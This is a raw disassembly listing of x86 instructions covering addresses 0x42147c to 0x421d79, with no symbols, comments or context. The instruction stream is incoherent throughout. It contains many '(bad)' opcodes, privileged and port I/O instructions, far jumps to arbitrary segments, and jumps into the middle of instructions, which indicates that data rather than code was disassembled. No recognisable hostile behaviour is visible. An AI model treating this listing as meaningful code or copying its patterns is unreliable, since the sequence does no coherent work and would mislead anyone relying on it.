  42147c:	jae    0x4214a0
  42147e:	jg     0x4214d0
  421480:	xor    eax,0x92882040
  421485:	out    dx,eax
  421486:	lahf   
  421487:	inc    esp
  421488:	imul   ebp,DWORD PTR [eax],0x37
  42148b:	enter  0xa4,0x91
  42148f:	shl    BYTE PTR [ecx],0x63
  421492:	aam    0xf9
  421494:	mov    ds:0x24e1,eax
	...
  421511:	add    BYTE PTR [eax],al
  421513:	add    BYTE PTR [eax+ebx*1-0x2923a928],bl
  42151a:	sahf   
  42151b:	fidivr DWORD PTR [esi-0x64]
  42151e:	add    al,ah
  421520:	out    0xc3,al
  421522:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421523:	and    eax,0x1ac8d
  421528:	imul   eax,DWORD PTR [edi],0x0
  42152b:	add    ah,ah
  42152d:	cli    
  42152e:	not    BYTE PTR [edx]
  421530:	or     DWORD PTR [esi+0x1f807626],ecx
  421536:	std    
  421537:	in     eax,dx
  421538:	imul   edx,DWORD PTR [edx],0xac8eaef
  42153e:	int3   
  42153f:	test   ebp,ebp
  421541:	sub    al,0x20
  421543:	scas   eax,DWORD PTR es:[edi]
  421544:	push   0x75
  421546:	add    dl,BYTE PTR [eax+eiz*4-0x60]
  42154a:	cmp    eax,0x4fc280b7
  42154f:	jnp    0x421531
  421551:	mov    dl,0x53
  421553:	cmp    BYTE PTR [ecx],0xc4
  421556:	mov    esi,0x973000a5
  42155b:	repz mov al,0xc9
  42155e:	pop    esp
  42155f:	push   ebx
  421560:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421561:	sub    al,0xc0
  421563:	mov    bl,0xe7
  421565:	fcmovnb st,st(4)
  421567:	cmp    bl,dl
  421569:	out    0x56,eax
  42156b:	enter  0xda86,0xda
  42156f:	jle    0x421524
  421571:	lock cmp eax,0xa5472f2c
  421577:	xchg   esi,eax
  421578:	inc    DWORD PTR [edx+0x8]
  42157b:	daa    
  42157c:	dec    eax
  42157d:	add    DWORD PTR [edi+0x75035960],ecx
  421583:	ja     0x421554
  421585:	pushf  
  421586:	dec    edx
  421587:	hlt    
  421588:	or     al,0xaa
  42158a:	inc    edx
  42158b:	pop    edi
  42158c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42158d:	test   eax,0xa050da4d
  421592:	test   eax,ebp
  421594:	add    dl,BYTE PTR [eax-0x720e0143]
  42159a:	dec    edi
  42159b:	or     DWORD PTR [ebx+0x19af1733],edx
  4215a1:	imul   esi,edi,0x20dc8309
  4215a7:	add    eax,0xe6ebb50a
  4215ac:	push   edi
  4215ad:	add    BYTE PTR [ebp+ecx*8+0x699bc911],bh
  4215b4:	jae    0x4215fb
  4215b6:	lea    ebx,[ecx-0x7ce69f40]
  4215bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4215bd:	jno    0x421540
  4215bf:	pop    ss
  4215c0:	xchg   bx,ax
  4215c2:	lods   al,BYTE PTR ds:[esi]
  4215c3:	cmp    al,0xd1
  4215c5:	xor    DWORD PTR [bp+si+0x5],esi
  4215c9:	mov    al,0x80
  4215cb:	fimul  WORD PTR [ebp+0x3b]
  4215ce:	mov    cl,0xe
  4215d0:	sbb    eax,0xb3279581
  4215d5:	mul    edx
  4215d7:	dec    esi
  4215d8:	push   0x925d8d0a
  4215dd:	or     eax,0xc36dd283
  4215e2:	mov    DWORD PTR [edi],esi
  4215e4:	jo     0x421648
  4215e6:	xor    ebx,DWORD PTR [edi+esi*8-0x7b8dc845]
  4215ed:	adc    cl,BYTE PTR [esi+0x42]
  4215f0:	xchg   edi,eax
  4215f1:	cmc    
  4215f2:	push   ebp
  4215f3:	shl    DWORD PTR [esi],cl
  4215f5:	enter  0xb553,0x7c
  4215f9:	push   ds
  4215fa:	cdq    
  4215fb:	cmp    eax,DWORD PTR [eax+0x3466f7ff]
  421601:	mov    ch,0xc
  421603:	dec    esi
  421604:	and    bl,bl
  421606:	fisub  WORD PTR [ecx+ecx*4+0x41]
  42160a:	and    DWORD PTR [edx],0xbad1e5cb
  421610:	jmp    0xf347:0xb0551bd3
  421617:	sar    DWORD PTR [edi+0x7820a222],1
  42161d:	iret   
  42161e:	ja     0x4215ee
  421620:	sub    eax,DWORD PTR [ebp-0xb]
  421623:	pop    edx
  421624:	add    eax,0x72928f05
  421629:	pop    ebp
  42162a:	ss enter 0x505e,0x98
  42162f:	and    DWORD PTR ds:0xaa26a7b2,0x3def77f6
  421639:	shr    ebx,0x73
  42163c:	sbb    al,0x42
  42163e:	or     DWORD PTR [esi+0x7d0652bc],ebx
  421644:	push   ss
  421645:	test   eax,0x467c89d2
  42164a:	pop    edx
  42164b:	jb     0x4216a0
  42164d:	and    eax,0x5316995
  421652:	pop    esp
  421653:	add    DWORD PTR [edx],esi
  421655:	mov    BYTE PTR [eax-0x2c8e8257],ah
  42165b:	jns    0x421660
  42165d:	push   0x3bb18372
  421662:	scas   al,BYTE PTR es:[edi]
  421663:	or     bl,BYTE PTR [esi+0x3]
  421666:	fs mov bl,ah
  421669:	and    bh,BYTE PTR [edi+0x533aeb9c]
  42166f:	cmp    eax,0x8aed4464
  421674:	lahf   
  421675:	(bad)  
  421676:	adc    eax,0x2467997e
  42167b:	pop    edx
  42167c:	sub    esi,DWORD PTR [eax]
  42167e:	pop    esi
  42167f:	push   esi
  421680:	inc    eax
  421681:	or     eax,0x6dd75a48
  421686:	mov    ch,0x49
  421688:	call   0xd3003860
  42168d:	imul   esp,ebx,0x567d5b14
  421693:	pop    esp
  421694:	dec    ebx
  421695:	js     0x421617
  421697:	mov    gs,WORD PTR [ebp+0x4df28f6d]
  42169d:	cld    
  42169e:	and    al,0x39
  4216a0:	adc    ah,BYTE PTR [edx]
  4216a2:	push   edx
  4216a3:	je     0x4216b8
  4216a5:	ja     0x42169b
  4216a7:	sub    BYTE PTR [esi+ecx*8+0x7786cdeb],dl
  4216ae:	cld    
  4216af:	(bad)  
  4216b0:	adc    BYTE PTR [ebx],bl
  4216b2:	xchg   ebp,eax
  4216b3:	adc    ebp,DWORD PTR [ecx+0x6af96031]
  4216b9:	scas   al,BYTE PTR es:[edi]
  4216ba:	sar    DWORD PTR [esi],cl
  4216bc:	sbb    al,0x4e
  4216be:	les    esp,FWORD PTR [edi+0x6a]
  4216c1:	imul   edx,DWORD PTR [ebp-0x7587a77d],0xffffffd4
  4216c8:	arpl   di,ax
  4216ca:	repz cmp edx,eax
  4216cd:	shr    ecx,cl
  4216cf:	sbb    eax,0xa3ace99a
  4216d4:	push   edx
  4216d5:	rcr    BYTE PTR [edi+eax*2],cl
  4216d8:	and    BYTE PTR [eax+esi*2+0x33],dl
  4216dc:	lahf   
  4216dd:	pushf  
  4216de:	fmul   QWORD PTR [ebp-0x18ab9720]
  4216e4:	int3   
  4216e5:	sub    BYTE PTR [edi-0x7d013284],dl
  4216eb:	(bad)  
  4216ed:	inc    edx
  4216ee:	pusha  
  4216ef:	push   edx
  4216f0:	fnstenv [edx-0x7f]
  4216f3:	loope  0x421763
  4216f5:	out    dx,al
  4216f6:	adc    bl,ah
  4216f8:	pop    esi
  4216f9:	imul   esp,DWORD PTR [edx-0x27ba697c],0x437c75cc
  421703:	dec    esp
  421704:	fidiv  DWORD PTR [edx*8+0x21309c44]
  42170b:	fucom  st(7)
  42170d:	rcl    esi,1
  42170f:	mov    ebx,0xd9f626ad
  421714:	shr    BYTE PTR [edi+0x4c3b243d],cl
  42171a:	inc    esp
  42171b:	test   al,0x2c
  42171d:	stc    
  42171e:	mov    ch,0xcd
  421720:	pop    ss
  421721:	adc    eax,0xd9889864
  421726:	aaa    
  421727:	add    al,0x39
  421729:	mov    edx,0x934416c0
  42172e:	add    BYTE PTR [ebp-0x1cb5bf3e],bl
  421734:	and    edx,DWORD PTR [esi-0x1f]
  421737:	mov    ecx,edi
  421739:	jae    0x421765
  42173b:	ds nop
  42173d:	out    dx,eax
  42173e:	fidiv  WORD PTR [ebx+0x1d]
  421741:	add    BYTE PTR fs:[esi+eiz*2+0x4a],bl
  421746:	stos   BYTE PTR es:[edi],al
  421747:	add    DWORD PTR [ebx+ebp*1],esp
  42174a:	jge    0x42170a
  42174c:	pop    eax
  42174d:	popa   
  42174e:	je     0x4216de
  421750:	arpl   si,ax
  421752:	out    dx,al
  421753:	mov    ebp,?
  421755:	daa    
  421756:	jl     0x4216f5
  421758:	bound  edi,QWORD PTR [edi+ebp*1-0x7f]
  42175c:	add    eax,0x4ef7a57f
  421761:	mov    ds:0x17e6fb43,al
  421766:	mov    WORD PTR [edx+0x6e],gs
  421769:	fmul   QWORD PTR [ebx]
  42176b:	jp     0x4216f7
  42176d:	retf   0x7d47
  421770:	rol    DWORD PTR [esi],0x68
  421773:	lahf   
  421774:	popa   
  421775:	rol    DWORD PTR [eax+0x3551fb66],0x46
  42177c:	jg     0x421730
  42177e:	or     ah,ch
  421780:	inc    esp
  421781:	repnz inc BYTE PTR [ecx+edi*8-0x1b4fbbe0]
  421789:	inc    edx
  42178a:	jbe    0x421762
  42178c:	inc    esi
  42178d:	push   ds
  42178e:	cmp    edx,DWORD PTR [ebx+0x2adb6738]
  421794:	daa    
  421795:	cmp    dl,ch
  421797:	mov    ds:0xfd1a2eee,eax
  42179c:	stos   BYTE PTR es:[edi],al
  42179d:	gs int3 
  42179f:	in     al,dx
  4217a0:	iret   
  4217a1:	jns    0x42177d
  4217a3:	xor    DWORD PTR [ecx-0x1ad614c4],esi
  4217a9:	imul   ebp,ebp,0x57
  4217ac:	sbb    eax,0x30fd20aa
  4217b1:	add    ah,ah
  4217b3:	jp     0x42174a
  4217b5:	xor    ch,BYTE PTR [ecx]
  4217b7:	in     al,0x45
  4217b9:	dec    ecx
  4217ba:	sahf   
  4217bb:	add    DWORD PTR [edi+0x5e],0x3e
  4217bf:	leave  
  4217c0:	cmp    ah,BYTE PTR [esi-0x6e4f5f14]
  4217c6:	inc    esp
  4217c7:	das    
  4217c8:	arpl   WORD PTR [edi+0x27263d2e],dx
  4217ce:	ret    0xd2c3
  4217d1:	fwait
  4217d2:	jl     0x4217d3
  4217d4:	cld    
  4217d5:	(bad)  
  4217d6:	imul   BYTE PTR [ecx+0x5bee8ad1]
  4217dc:	sbb    DWORD PTR ds:0x628885d9,esp
  4217e2:	or     eax,0xfab778b5
  4217e7:	and    eax,edi
  4217e9:	cwde   
  4217ea:	dec    esi
  4217eb:	call   0x10ab:0x7537da38
  4217f2:	mov    ch,0x40
  4217f4:	ins    DWORD PTR es:[edi],dx
  4217f5:	lds    edx,FWORD PTR [edx]
  4217f7:	mov    bl,0xca
  4217f9:	mov    al,0xd9
  4217fb:	ror    al,1
  4217fd:	adc    eax,0x11787b8f
  421802:	std    
  421803:	scas   eax,DWORD PTR es:[edi]
  421804:	inc    esp
  421805:	enter  0xe322,0x8e
  421809:	or     DWORD PTR [edx-0x8fbde5],ebx
  42180f:	lea    ebp,[esi+edi*8]
  421812:	push   esp
  421813:	lock popa 
  421815:	cmp    BYTE PTR [edx+eax*2+0x4ceb512],ah
  42181c:	push   cs
  42181d:	in     eax,dx
  42181e:	mov    ds:0xe6124ba7,al
  421823:	xlat   BYTE PTR ds:[ebx]
  421824:	sub    DWORD PTR [esi],ebx
  421826:	bound  ebx,QWORD PTR [edi+0x10]
  421829:	popa   
  42182a:	loop   0x421866
  42182c:	(bad)  
  42182d:	fmulp  st(4),st
  42182f:	jmp    0x4217d6
  421831:	mov    ebx,0xe5e9fc96
  421836:	into   
  421837:	mov    ch,0x79
  421839:	xlat   BYTE PTR ds:[ebx]
  42183a:	and    DWORD PTR [edi+0x24],eax
  42183d:	outs   dx,BYTE PTR ds:[esi]
  42183e:	(bad)  [ebx-0x999c871]
  421844:	iret   
  421845:	cld    
  421846:	ss scas eax,DWORD PTR es:[edi]
  421848:	loop   0x421874
  42184a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42184b:	jmp    0xb8e2:0xea9f77fa
  421852:	test   BYTE PTR cs:[ecx+0x4332e4bf],bl
  421859:	icebp  
  42185a:	sbb    BYTE PTR [ecx+0x32cd2f44],ah
  421860:	or     eax,0x36b668f7
  421865:	(bad)  
  421866:	pop    eax
  421867:	jle    0x42186a
  421869:	cmp    DWORD PTR [edi+ebx*2],ebx
  42186c:	nop
  42186d:	push   cs
  42186e:	(bad)  
  42186f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421870:	sub    eax,0xa3e4ab31
  421875:	mov    ch,0x8
  421877:	pmaxsw mm2,mm6
  42187a:	mov    fs,WORD PTR [ecx+ebx*1]
  42187d:	imul   DWORD PTR [edx+0x42df2d5a]
  421883:	out    dx,al
  421884:	sbb    al,0x77
  421886:	imul   ecx,ecx,0x34
  421889:	push   ds
  42188a:	jp     0x4218a0
  42188c:	adc    DWORD PTR [ebx+0x77],edx
  42188f:	inc    ch
  421891:	mov    DWORD PTR [edi+0x60],edx
  421894:	inc    ebp
  421895:	(bad)  
  421896:	adc    DWORD PTR [esi],edx
  421898:	lds    ebp,FWORD PTR [esi+0x2a]
  42189b:	sahf   
  42189c:	dec    edx
  42189d:	dec    ebx
  42189e:	push   esp
  42189f:	popa   
  4218a0:	push   ebp
  4218a1:	and    edi,ebx
  4218a3:	add    eax,0xb8208457
  4218a8:	scas   al,BYTE PTR es:[edi]
  4218a9:	add    DWORD PTR [ecx],edx
  4218ab:	fsubr  QWORD PTR [ebp+0x193b5ebd]
  4218b1:	push   eax
  4218b2:	ret    
  4218b3:	jb     0x42183a
  4218b5:	and    DWORD PTR ds:0x9195a4a,ebx
  4218bb:	mov    dl,0x6
  4218bd:	fadd   QWORD PTR [edx+0x4ac65583]
  4218c3:	pop    edx
  4218c4:	xor    cl,al
  4218c6:	(bad)  
  4218c7:	mov    bh,0x88
  4218c9:	mov    al,BYTE PTR [edi+0x4e255d94]
  4218cf:	mov    ah,0xb3
  4218d1:	pusha  
  4218d2:	jbe    0x42188a
  4218d4:	test   BYTE PTR [ecx+esi*8+0x43],0xa5
  4218d9:	int    0x28
  4218db:	mov    ds,WORD PTR [eax+0x52]
  4218de:	jmp    0x7be8:0xdab8648e
  4218e5:	scas   al,BYTE PTR es:[edi]
  4218e6:	inc    ecx
  4218e7:	mov    ds:0xf506e1fb,al
  4218ec:	fbld   TBYTE PTR [edi+0x6a]
  4218ef:	rcr    BYTE PTR [ebx+0x27],cl
  4218f2:	sub    eax,0xc7ddc7ad
  4218f7:	add    al,0x89
  4218f9:	lods   eax,DWORD PTR ds:[esi]
  4218fa:	or     DWORD PTR [ecx],esp
  4218fc:	mov    BYTE PTR [ebx+0x7efcf431],dh
  421902:	int    0x56
  421904:	dec    esi
  421905:	xchg   ebx,eax
  421906:	adc    eax,0x9c8daf92
  42190b:	sbb    edi,DWORD PTR [edx+edx*4+0x25]
  42190f:	xchg   DWORD PTR [edi-0x19],ebx
  421912:	clc    
  421913:	jecxz  0x421900
  421915:	xchg   BYTE PTR [eax+edi*8],dh
  421918:	pop    eax
  421919:	push   esi
  42191a:	or     al,0x8d
  42191c:	mov    eax,ds:0xe85bd474
  421921:	mov    es,WORD PTR [eax+0x36643278]
  421927:	jmp    0x421901
  421929:	and    ah,ah
  42192b:	sar    DWORD PTR [edx-0x4bc95a74],cl
  421931:	ins    BYTE PTR es:[edi],dx
  421932:	xchg   ch,bl
  421934:	loop   0x421923
  421936:	scas   al,BYTE PTR es:[edi]
  421937:	out    0x91,al
  421939:	fldenv [eax+eax*4]
  42193c:	xor    ah,dl
  42193e:	push   ds
  42193f:	push   esp
  421940:	inc    ebx
  421941:	arpl   WORD PTR [esp+eax*2],si
  421944:	add    eax,0x71b37a7f
  421949:	and    edi,edx
  42194b:	jle    0x421975
  42194d:	jmp    0x421900
  42194f:	and    eax,0xee172db2
  421954:	xchg   DWORD PTR [esi+0x2159d175],ebx
  42195a:	jg     0x421951
  42195c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42195d:	mov    ds:0xf6f8dad9,eax
  421962:	fisubr DWORD PTR [eax]
  421964:	xchg   edx,eax
  421965:	add    eax,0x8a92dd47
  42196a:	or     ah,BYTE PTR [edx+0xa]
  42196d:	xlat   BYTE PTR ds:[ebx]
  42196e:	add    al,0xa5
  421970:	into   
  421971:	xor    ch,dl
  421973:	mov    ecx,0x5bbf85d5
  421978:	test   ebp,ebp
  42197a:	aad    0x7f
  42197c:	call   0x8df24a42
  421981:	imul   esi,DWORD PTR [esi],0x5af428db
  421987:	xchg   esi,eax
  421988:	les    edi,FWORD PTR [edi]
  42198a:	cmp    esi,DWORD PTR ds:0x43184f8e
  421990:	and    esp,ecx
  421992:	jg     0x42198b
  421994:	inc    ecx
  421995:	push   es
  421996:	pop    es
  421997:	xor    BYTE PTR [ebx-0x59bcb895],bh
  42199d:	aaa    
  42199e:	xchg   BYTE PTR [esi],ah
  4219a0:	adc    al,0x4d
  4219a2:	pop    ebx
  4219a3:	inc    ebp
  4219a4:	int3   
  4219a5:	adc    DWORD PTR [ebx-0x3d081cf0],ebp
  4219ab:	jb     0x4219f3
  4219ad:	sub    DWORD PTR ds:0x9635c816,edx
  4219b3:	(bad)  
  4219b4:	arpl   bx,sp
  4219b6:	(bad)  
  4219b7:	(bad)  
  4219b8:	stc    
  4219b9:	jae    0x421957
  4219bb:	mov    edx,0xea9c5362
  4219c0:	xor    ah,bl
  4219c2:	dec    edi
  4219c3:	and    DWORD PTR cs:[ecx-0x6a],esi
  4219c7:	xchg   edx,eax
  4219c8:	pusha  
  4219c9:	mov    edx,0xd38869a9
  4219ce:	xchg   esp,eax
  4219cf:	retf   0x552c
  4219d2:	mov    esi,0xa2b0f403
  4219d7:	jnp    0x42197b
  4219d9:	mov    cl,0x23
  4219db:	and    DWORD PTR ds:0x4a0dc664,ecx
  4219e1:	pop    ebp
  4219e2:	dec    esi
  4219e3:	push   0xffffffed
  4219e5:	add    DWORD PTR [ebp-0x29],eax
  4219e8:	(bad)  
  4219e9:	mov    ebx,0x76207a7e
  4219ee:	pop    es
  4219ef:	push   esp
  4219f0:	xchg   esi,eax
  4219f1:	cmp    eax,0xfe18e347
  4219f6:	jge    0x421a73
  4219f8:	xchg   edi,eax
  4219f9:	adc    bl,BYTE PTR [esi]
  4219fb:	loop   0x4219a7
  4219fd:	cmp    ecx,ebp
  4219ff:	pop    es
  421a00:	push   ds
  421a01:	inc    esi
  421a02:	call   DWORD PTR [ebx+0x6b5dcc62]
  421a08:	bound  esi,QWORD PTR [ebp-0x4f550e25]
  421a0e:	(bad)  
  421a0f:	cmp    al,0x9d
  421a11:	mov    ecx,0x691ddfc6
  421a16:	(bad)  
  421a17:	pop    ebp
  421a18:	mov    esp,0x7fcdaf7d
  421a1d:	or     cl,ch
  421a1f:	inc    ebp
  421a20:	mov    esi,DWORD PTR [edx-0x6f576fd0]
  421a26:	cmp    al,0x26
  421a28:	call   0x471646ba
  421a2d:	call   0xf48:0xa37c02ca
  421a34:	sbb    eax,0xa4f54ad8
  421a39:	sbb    DWORD PTR [ebp+0x5f],ebx
  421a3c:	xchg   ebx,eax
  421a3d:	push   ebp
  421a3e:	jae    0x421a65
  421a40:	sahf   
  421a41:	inc    edx
  421a42:	xchg   edx,eax
  421a43:	dec    eax
  421a44:	jmp    0x4219c6
  421a46:	add    BYTE PTR [edi],bl
  421a48:	sub    BYTE PTR [esp+ebx*8+0x39bb23f3],ah
  421a4f:	fistp  QWORD PTR [edi+0x56]
  421a52:	outs   dx,BYTE PTR ds:[esi]
  421a53:	hlt    
  421a54:	push   edi
  421a55:	(bad)  
  421a56:	and    BYTE PTR [esi-0xd3d1d2a],al
  421a5c:	pop    eax
  421a5d:	adc    esi,DWORD PTR [edx-0x51]
  421a60:	xlat   BYTE PTR ds:[ebx]
  421a61:	mul    DWORD PTR [ebx+0xdb8931b]
  421a67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421a68:	popf   
  421a69:	or     DWORD PTR [ecx-0x22ee84c8],ebp
  421a6f:	push   0xffffff81
  421a71:	adc    al,0x4e
  421a73:	pop    eax
  421a74:	mov    edi,DWORD PTR ds:0xad477833
  421a7a:	int3   
  421a7b:	push   ss
  421a7c:	pop    esp
  421a7d:	xchg   esi,eax
  421a7e:	jne    0x421ab5
  421a80:	fadd   DWORD PTR [esi-0x3d3cf39d]
  421a86:	mov    bh,0x37
  421a88:	sbb    ch,al
  421a8a:	mov    BYTE PTR [esp+edi*8-0x77c9aca9],bh
  421a91:	into   
  421a92:	inc    edi
  421a93:	mov    bh,0xf9
  421a95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421a96:	lods   eax,DWORD PTR ds:[esi]
  421a97:	test   al,0xa2
  421a99:	nop
  421a9a:	add    BYTE PTR [ebx],dh
  421a9c:	retf   0x3f93
  421a9f:	repnz and eax,0xcf33f923
  421aa5:	js     0x421a49
  421aa7:	repz add BYTE PTR [edi+edi*4],0x77
  421aac:	imul   esp,DWORD PTR [ebx-0x32],0xcec23712
  421ab3:	cmp    ah,cl
  421ab5:	retf   
  421ab6:	gs pop edx
  421ab8:	mov    esp,0xa26b6117
  421abd:	and    BYTE PTR [eiz*2-0x1b88b97a],bl
  421ac4:	sub    eax,0x91980f77
  421ac9:	xor    DWORD PTR [ecx-0x3b],edi
  421acc:	popf   
  421acd:	sub    DWORD PTR [ebx],0x8ee943ea
  421ad3:	and    dh,BYTE PTR ds:0x1c4eb7ef
  421ad9:	jno    0x421a87
  421adb:	pop    ebx
  421adc:	xchg   ch,bh
  421ade:	cld    
  421adf:	mov    DWORD PTR [ecx+0x1f],ebp
  421ae2:	and    al,0x84
  421ae4:	rol    edx,cl
  421ae6:	aad    0x26
  421ae8:	pop    esp
  421ae9:	jae    0x421b21
  421aeb:	mov    esi,0x1c9ed22f
  421af0:	pop    ds
  421af1:	xor    BYTE PTR [edx],cl
  421af3:	test   DWORD PTR [ecx-0x77],edx
  421af6:	pusha  
  421af7:	aas    
  421af8:	sbb    al,0x5a
  421afa:	xchg   edi,eax
  421afb:	and    edx,eax
  421afd:	mov    ds,WORD PTR ds:0x9f13e4b0
  421b03:	push   esi
  421b04:	push   esp
  421b05:	call   0xe503ded5
  421b0a:	or     eax,0x9993c574
  421b0f:	loop   0x421b41
  421b11:	jno    0x421ac8
  421b13:	daa    
  421b14:	in     eax,dx
  421b15:	shr    DWORD PTR [edx],cl
  421b17:	mov    ebx,0xdab5829
  421b1c:	jmp    0x421b34
  421b1e:	add    dh,bl
  421b20:	pushf  
  421b21:	addr16 out dx,eax
  421b23:	jbe    0x421b95
  421b25:	lods   eax,DWORD PTR ds:[esi]
  421b26:	sub    edi,DWORD PTR [ebp-0x5549a108]
  421b2c:	mov    al,ds:0x5ecc9e10
  421b31:	fwait
  421b32:	xchg   dl,bl
  421b34:	das    
  421b35:	(bad)  
  421b36:	and    al,0x4b
  421b38:	(bad)  
  421b39:	int3   
  421b3a:	out    dx,al
  421b3b:	add    cl,BYTE PTR [ebx+edx*4-0x79ecd9ca]
  421b42:	cmp    DWORD PTR [esi],0xffffff8d
  421b45:	mov    bh,0xa4
  421b47:	iret   
  421b48:	and    BYTE PTR [edi-0x38],dl
  421b4b:	loope  0x421b2c
  421b4d:	xchg   edx,eax
  421b4e:	fs mov dh,0x10
  421b51:	push   ss
  421b52:	leave  
  421b53:	push   eax
  421b54:	add    ah,dl
  421b56:	push   edx
  421b57:	(bad)  
  421b58:	cs mov esi,ds
  421b5b:	jg     0x421b7f
  421b5d:	shr    BYTE PTR [eax-0x35],1
  421b60:	xchg   ebx,eax
  421b61:	and    al,0xe5
  421b63:	mov    WORD PTR [esi-0x4],cs
  421b66:	mov    bh,0x6a
  421b68:	jp     0x421b32
  421b6a:	push   edx
  421b6b:	in     eax,dx
  421b6c:	inc    edi
  421b6d:	xchg   DWORD PTR [ebp-0x493288b0],ecx
  421b73:	push   ebp
  421b74:	pop    esi
  421b75:	sbb    al,0x5f
  421b77:	and    bh,BYTE PTR [edi]
  421b79:	into   
  421b7a:	inc    esp
  421b7b:	dec    edx
  421b7c:	jne    0x421b91
  421b7e:	ins    BYTE PTR es:[edi],dx
  421b7f:	rcl    BYTE PTR [ecx+edx*4+0xb0a1e62],cl
  421b86:	jae    0x421b0a
  421b88:	nop
  421b89:	xchg   edx,eax
  421b8a:	xchg   esi,eax
  421b8b:	js     0x421bd5
  421b8d:	fstp   QWORD PTR [ebx+eax*4+0x5c]
  421b91:	lea    ecx,[ecx-0x1a4f2b70]
  421b97:	sub    bh,BYTE PTR [ebx+0x18]
  421b9a:	shl    ch,1
  421b9c:	push   ss
  421b9d:	jl     0x421b4a
  421b9f:	adc    al,0x33
  421ba1:	jb     0x421c08
  421ba3:	sbb    ebx,DWORD PTR [eax+0x34]
  421ba6:	jnp    0x421b52
  421ba8:	cdq    
  421ba9:	xchg   ecx,eax
  421baa:	or     bl,BYTE PTR [esi-0x4fb1c968]
  421bb0:	cmp    bl,dl
  421bb2:	and    eax,0x7d22002c
  421bb7:	mov    WORD PTR [edx+0x70],fs
  421bba:	ror    DWORD PTR [eax+0x59],cl
  421bbd:	xor    al,0xc
  421bbf:	sub    dl,cl
  421bc1:	mov    WORD PTR [edi],ds
  421bc3:	inc    edx
  421bc4:	sbb    al,ah
  421bc6:	div    DWORD PTR [eax+0x74]
  421bc9:	rcl    cl,1
  421bcb:	push   0xfd9fcb8d
  421bd0:	repnz outs dx,DWORD PTR ds:[esi]
  421bd2:	(bad)  
  421bd3:	push   esi
  421bd4:	xor    esp,DWORD PTR [ecx-0x89dfeca]
  421bda:	sub    BYTE PTR [ebx],ah
  421bdc:	push   edi
  421bdd:	xchg   esi,eax
  421bde:	adc    al,0x53
  421be0:	or     esi,DWORD PTR [ecx+0x330e8841]
  421be6:	shr    dh,cl
  421be8:	out    dx,eax
  421be9:	sub    DWORD PTR [esi+0x9b71122],eax
  421bef:	(bad)  
  421bf0:	loopne 0x421b84
  421bf2:	clc    
  421bf3:	data16 jg 0x421c32
  421bf6:	lods   eax,DWORD PTR ds:[esi]
  421bf8:	mov    edi,0x8d42df9a
  421bfd:	jmp    0x86220d68
  421c02:	out    0x86,al
  421c04:	xchg   edi,eax
  421c05:	hlt    
  421c06:	sbb    DWORD PTR [eax],eax
  421c08:	xchg   esi,eax
  421c09:	icebp  
  421c0a:	or     ch,BYTE PTR [edx]
  421c0c:	cs enter 0xf4a0,0x0
  421c11:	(bad)  
  421c12:	gs scas eax,DWORD PTR es:[edi]
  421c14:	mov    ah,0x77
  421c16:	cs loope 0x421c51
  421c19:	inc    ecx
  421c1a:	imul   edi,DWORD PTR [eax],0x7344f6f8
  421c20:	iret   
  421c21:	sub    BYTE PTR [eax+0x77],ah
  421c24:	add    ecx,DWORD PTR [ecx-0x682b1575]
  421c2a:	or     eax,0x51da043c
  421c2f:	gs adc edi,0x737c0c07
  421c36:	sbb    al,0x69
  421c38:	push   esp
  421c39:	dec    ebx
  421c3a:	jmp    0xa95:0x634eae54
  421c41:	mov    bh,BYTE PTR [ebp+esi*1-0x34]
  421c45:	push   0xcb0671a5
  421c4a:	cmp    DWORD PTR [ebp+ebp*1+0x45ff786d],0xfffffffe
  421c52:	and    al,0x18
  421c54:	xor    eax,0xab249374
  421c59:	aaa    
  421c5a:	aas    
  421c5b:	cmp    dl,BYTE PTR [edx-0x38]
  421c5e:	xor    ebx,DWORD PTR [ebx+edi*2+0x1c]
  421c62:	add    cl,BYTE PTR [edi+0x382c0f9c]
  421c68:	mov    ch,0xf
  421c6a:	xchg   ebp,eax
  421c6b:	push   0xdca473be
  421c70:	xor    ah,BYTE PTR [ebx-0x7]
  421c73:	loop   0x421c92
  421c75:	or     ah,BYTE PTR [esi]
  421c77:	(bad)  
  421c79:	retf   
  421c7a:	push   esp
  421c7b:	pop    esi
  421c7c:	pusha  
  421c7d:	test   eax,0xb84f08ef
  421c82:	cmp    al,0x28
  421c84:	sub    ch,BYTE PTR [ebx+0x727593c2]
  421c8a:	lods   al,BYTE PTR ds:[esi]
  421c8b:	icebp  
  421c8c:	push   ecx
  421c8d:	std    
  421c8e:	mov    edx,0x967f1077
  421c93:	xor    ch,BYTE PTR [ecx]
  421c95:	xor    DWORD PTR [bx+si],eax
	...
  421d14:	arpl   WORD PTR [esi+0x63ff63be],bx
  421d1a:	call   FWORD PTR [esi-0x676d79db]
  421d20:	jbe    0x421cd6
  421d22:	mov    edi,0x1b3f80f
  421d27:	add    BYTE PTR [ebx+0x7],ch
  421d2a:	add    BYTE PTR [eax],al
  421d2c:	test   esp,ebp
  421d2e:	out    dx,al
  421d2f:	jo     0x421cee
  421d31:	or     esp,DWORD PTR [ebx+eiz*8-0x3]
  421d35:	lock bswap ecx
  421d38:	enter  0x80ea,0x49
  421d3c:	in     al,dx
  421d3d:	xor    eax,0x7ea25cf
  421d42:	adc    DWORD PTR ds:0xa9e769fc,ebx
  421d48:	dec    edx
  421d49:	mov    dl,bl
  421d4b:	(bad)  
  421d4c:	lods   eax,DWORD PTR ds:[esi]
  421d4d:	cmp    al,0x45
  421d4f:	jb     0x421d7f
  421d51:	fcom   QWORD PTR [edi+0x2a]
  421d54:	xchg   esi,eax
  421d55:	sti    
  421d56:	push   eax
  421d57:	aad    0x4b
  421d59:	out    0x1f,eax
  421d5b:	xor    bh,cl
  421d5d:	push   0x72
  421d5f:	test   eax,0xd4b6bc2a
  421d64:	pop    ebx
  421d65:	cdq    
  421d66:	in     eax,0x3b
  421d68:	nop
  421d69:	cwde   
  421d6a:	loopne 0x421d85
  421d6c:	adc    al,0x89
  421d6e:	pop    edi
  421d6f:	es and eax,0x7efe305c
  421d75:	pop    ebp
  421d76:	pop    es
  421d77:	mov    ah,0x37
  421d79:	or     BYTE PTR ds:0xa7c04fc,cl
